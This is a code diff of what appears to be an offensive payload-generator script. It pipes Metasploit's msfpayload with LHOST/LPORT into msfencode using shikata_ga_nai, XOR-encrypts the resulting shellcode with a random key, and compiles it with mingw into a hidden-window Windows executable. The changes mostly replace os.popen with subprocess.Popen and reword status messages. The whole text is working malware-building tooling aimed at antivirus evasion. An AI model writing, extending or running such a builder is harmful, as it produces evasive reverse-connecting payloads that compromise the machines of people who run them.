@@ -2,7 +2,7 @@
 #
 
 import os
-import subprocess
+import subprocess as subp
 from src.core import menus
 from src.core.main import *
 from time import sleep
@@ -60,34 +60,30 @@ while 1:
 			iterations = raw_input(" Number of times to encode shellcode (default 10): ")
 			if iterations == '':
 				iterations = 10
-
+				
 		# create payload
 		if encoding == '1':
-			PrintInfo("Creating payload with x%s shikata_ga_nai. Please wait..." % iterations)
+			PrintInfo("Creating shellcode with x%s shikata_ga_nai. Please wait..." % iterations)
 			print ""
-			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" % (path, payload, ip, port, path, iterations)).read()
-			PrintInfo("Shellcode generated")
-			sleep(1)
-			PrintInfo("Encoding shellcode")
-			sleep(1)
+			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
+									% (path, payload, ip, port, path, iterations), shell=True, stdout=subp.PIPE)
+			
+			shellcode = proc.communicate()[0]
+			
 		elif encoding == '2':
-			PrintInfo("Creating payload. Please wait...")
-			print ""
-			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s C " % (path, payload, ip, port)).read()
-			PrintInfo("Shellcode generated")
-			sleep(1)
-			PrintInfo("Encoding shellcode")
-			sleep(1)
+			PrintInfo("Generating Shellcode. Please wait...")
+			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s C " \
+								% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
+								
+			shellcode = proc.communicate()[0]
 
 		key = generate_random_string(10, 25)
-		PrintInfo("Using random key %s" % key)
+		PrintInfo("Starting XOR encryption with random key %s" % key)
 		encrypted = xor_string(shellcode, key)
 		xor = hexlify(encrypted)
 		sleep(1)
 	
-		PrintInfo("Shellcode encoded")
-		sleep(1)
-		PrintInfo("Creating template.c")
+		PrintInfo("Building template.c")
 		sleep(1)
 	
 		# write c file
@@ -99,8 +95,8 @@ while 1:
 		
 		# compile payload
 		PrintInfo("File created. Compiling...")
-		subprocess.Popen("i586-mingw32msvc-gcc -o output/payload.exe output/template.c -mwindows > /dev/null 2>&1", shell=True).wait()
-		PrintInfo("File payload.exe created in the output directory")
+		subp.Popen("i586-mingw32msvc-gcc -o output/paygen-pl.exe output/template.c -mwindows > /dev/null 2>&1", shell=True).wait()
+		PrintInfo("File paygen-pl.exe created in the output directory")
 		sleep(1)
 			
 		# clean up
